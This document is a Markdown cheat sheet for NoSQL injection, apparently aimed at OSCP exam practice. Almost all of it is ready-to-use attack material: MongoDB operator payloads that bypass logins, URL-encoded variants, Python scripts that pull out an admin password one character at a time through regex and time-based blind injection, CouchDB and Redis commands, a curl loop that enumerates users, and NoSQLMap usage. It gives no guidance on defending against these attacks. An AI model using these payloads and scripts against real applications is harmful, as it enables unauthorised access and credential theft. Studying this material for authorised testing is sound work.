# NoSQL Injection Exploitation Guide

## Table of Contents
1. [NoSQL Basics](#nosql-basics)
2. [MongoDB Injection](#mongodb-injection)
3. [Authentication Bypass](#authentication-bypass)
4. [Data Extraction](#data-extraction)
5. [Blind NoSQL Injection](#blind-nosql-injection)
6. [Other NoSQL Databases](#other-nosql-databases)

---

## NoSQL Basics

### Common NoSQL Databases
- **MongoDB**: Document-based (JSON-like)
- **Redis**: Key-value store
- **CouchDB**: Document-based
- **Cassandra**: Column-family

### Injection Operators (MongoDB)
```javascript
$eq   // Equal
$ne   // Not equal
$gt   // Greater than
$lt   // Less than
$gte  // Greater than or equal
$lte  // Less than or equal
$in   // In array
$nin  // Not in array
$regex // Regular expression
$where // JavaScript expression
```

---

## MongoDB Injection

### Detection

#### JSON Parameter
```http
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "test"}
```

#### Test Injection
```http
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

---

## Authentication Bypass

### Basic Bypass

#### JSON Injection
```json
# Normal
{"username": "admin", "password": "wrongpass"}

# Bypass - Not Equal
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}

# Bypass - Greater Than
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# Bypass - Regex
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

#### URL-Encoded Injection
```
username[$ne]=admin&password[$ne]=wrongpass
username[$gt]=&password[$gt]=
username[$regex]=^admin&password[$ne]=
```

#### Example HTTP Request
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=test&password[$ne]=test
```

### Specific User Bypass

```json
# Login as admin
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$eq": "admin"}, "password": {"$ne": ""}}

# Login as any admin user
{"username": {"$regex": "admin"}, "password": {"$ne": null}}
```

---

## Data Extraction

### Regex-Based Extraction

#### Extract Password Character by Character
```python
import requests
import string

url = "http://target.com/login"
charset = string.ascii_letters + string.digits + "!@#$%^&*()"
password = ""

for position in range(1, 30):
    for char in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password + char}"}
        }
        r = requests.post(url, json=payload)

        if "Welcome" in r.text:  # Success indicator
            password += char
            print(f"[+] Password so far: {password}")
            break
```

#### Extract Username
```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
# Continue until full username found
```

### Array Injection

#### Extract Data via $in
```json
{"username": {"$in": ["admin", "user", "test"]}, "password": {"$ne": ""}}
```

### JavaScript Injection ($where)

#### Execute JavaScript
```json
{"username": "admin", "password": {"$where": "this.password == 'secret'"}}

# Time-based detection
{"$where": "sleep(5000)"}

# Data extraction
{"$where": "this.password.match('^a')"}
```

---

## Blind NoSQL Injection

### Boolean-Based

#### Test Character
```python
import requests

def test_char(position, char):
    payload = {
        "username": "admin",
        "password": {"$regex": f"^.{{{position}}}{char}"}
    }
    r = requests.post("http://target.com/login", json=payload)
    return "Welcome" in r.text  # True if char is correct
```

### Time-Based

#### MongoDB Sleep
```json
{"username": "admin", "password": {"$where": "sleep(5000)"}}
```

#### Extract Data with Time Delay
```python
def extract_password():
    password = ""
    for pos in range(20):
        for char in string.printable:
            payload = {
                "username": "admin",
                "password": {
                    "$where": f"if (this.password[{pos}] == '{char}') {{ sleep(3000); }} return true;"
                }
            }
            start = time.time()
            requests.post(url, json=payload, timeout=10)
            elapsed = time.time() - start

            if elapsed > 3:
                password += char
                break
    return password
```

---

## Other NoSQL Databases

### CouchDB Injection

#### Authentication Bypass
```http
POST /_session HTTP/1.1
Content-Type: application/json

{"name": {"$ne": null}, "password": {"$ne": null}}
```

### Redis Injection

#### Command Injection (if exposed)
```bash
# Test connection
redis-cli -h target.com

# Get all keys
KEYS *

# Get value
GET key_name

# Set value
SET key value

# Execute Lua script (RCE if misconfigured)
EVAL "return redis.call('get', 'key')" 0
```

---

## OSCP Scenarios

### Scenario 1: Login Bypass
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}

# Response: {"token": "eyJhbGci...", "role": "admin"}
```

### Scenario 2: Extract Admin Password
```python
#!/usr/bin/env python3
import requests
import string

url = "http://target.com/api/login"
password = ""
chars = string.ascii_letters + string.digits + "_!@#"

for i in range(30):
    found = False
    for char in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password + char}"}
        }

        r = requests.post(url, json=payload)

        if r.status_code == 200 and "success" in r.text:
            password += char
            print(f"[+] Found: {password}")
            found = True
            break

    if not found:
        break

print(f"[+] Password: {password}")
```

### Scenario 3: User Enumeration
```bash
# Test usernames
for user in admin root administrator user test; do
    curl -X POST http://target.com/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$user\",\"password\":{\"\$ne\":\"\"}}"
done
```

---

## Payload Cheat Sheet

### Authentication Bypass
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}
```

### URL-Encoded
```
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username=admin&password[$ne]=
```

### Regex Extraction
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ad"}}
{"username": "admin", "password": {"$regex": "^adm"}}
```

### JavaScript Injection
```json
{"$where": "this.password == 'test'"}
{"$where": "sleep(5000)"}
{"$where": "this.password.match('^a')"}
```

---

## Tools

### NoSQLMap
```bash
git clone https://github.com/codingo/NoSQLMap
python nosqlmap.py -u http://target.com/login --post --params "username=admin&password=test"
```

### Manual with Burp Suite
```
1. Intercept login request
2. Send to Repeater
3. Change to JSON if not already
4. Inject NoSQL operators
5. Observe response
```

---

**Remember**: NoSQL injection is less common than SQL injection but very effective when found. Test all JSON endpoints!
